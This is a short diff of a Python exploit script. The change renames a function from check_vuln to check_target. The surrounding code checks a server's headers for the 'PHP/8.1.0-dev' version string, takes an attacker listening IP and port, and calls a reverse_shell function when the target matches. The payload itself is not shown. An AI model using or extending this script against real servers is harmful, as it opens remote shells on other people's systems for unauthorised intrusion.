@@ -30,8 +30,7 @@ import os, sys, argparse, requests
 
 request = requests.Session()
 
-
-def check_vuln(args):
+def check_target(args):
     response = request.get(args.url)
     for header in response.headers.items():
         if "PHP/8.1.0-dev" in header[1]:
@@ -48,7 +47,7 @@ def main():
     parser.add_argument("lhost", metavar='<attacker IP>', help="Attacker listening IP",)
     parser.add_argument("lport", metavar='<attacker PORT>', help="Attacker listening port")
     args = parser.parse_args()
-    if check_vuln(args):
+    if check_target(args):
         reverse_shell(args)
     else:
         print("Host is not available or vulnerable, aborting...")
